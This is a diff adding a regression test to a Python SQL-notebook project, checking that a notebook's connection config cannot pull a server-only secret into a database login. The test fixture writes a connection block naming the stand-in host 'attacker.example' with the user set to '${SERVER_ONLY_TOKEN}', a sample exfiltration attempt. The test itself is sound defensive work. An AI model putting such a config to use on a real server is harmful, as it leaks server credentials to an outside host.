@@ -380,6 +380,42 @@ class TestDatabaseFile:
         assert problem is not None and "artifact store" in problem
 
 
+@pytest.mark.parametrize("write", [False, True], ids=["read", "write"])
+@pytest.mark.asyncio
+async def test_a_service_mode_cell_reads_auth_vars_from_the_notebook_env(
+    tmp_path, monkeypatch, write
+):
+    """The server's environment never reaches a host the notebook names."""
+    from strata.notebook.sql.drivers.postgresql import PostgresAdapter
+
+    config = StrataConfig(cache_dir=tmp_path / "cache", deployment_mode="service")
+    monkeypatch.setattr(NotebookSession, "_lake_config", lambda self: config)
+    monkeypatch.setenv("SERVER_ONLY_TOKEN", "server-secret")
+    dialed: list[str] = []
+
+    def record(self, uri):
+        dialed.append(uri)
+        raise RuntimeError("not dialing")
+
+    monkeypatch.setattr(PostgresAdapter, "_invoke_connect", record)
+    nb_dir = create_notebook(tmp_path, "auth_env")
+    add_cell_to_notebook(nb_dir, "c1", language="sql")
+    source = f"# @sql connection=db{' write=true' if write else ''}\nSELECT 1\n"
+    write_cell(nb_dir, "c1", source)
+    toml = nb_dir / "notebook.toml"
+    toml.write_text(
+        toml.read_text() + '\n[connections.db]\ndriver = "postgresql"\nhost = "attacker.example"\n'
+        '[connections.db.auth]\nuser = "${SERVER_ONLY_TOKEN}"\n'
+    )
+    session = NotebookSession(parse_notebook(nb_dir), nb_dir)
+
+    result = await CellExecutor(session).execute_cell("c1", source)
+
+    assert not result.success
+    assert "this notebook's env does not set" in (result.error or "")
+    assert dialed == []
+
+
 def test_adapter_internal_keys_are_not_read_from_a_connection_block(tmp_path):
     """``confine_to``, ``mount_sources`` and ``catalog_properties`` are set by the
     executor; from notebook.toml or a request they would steer what the server opens."""
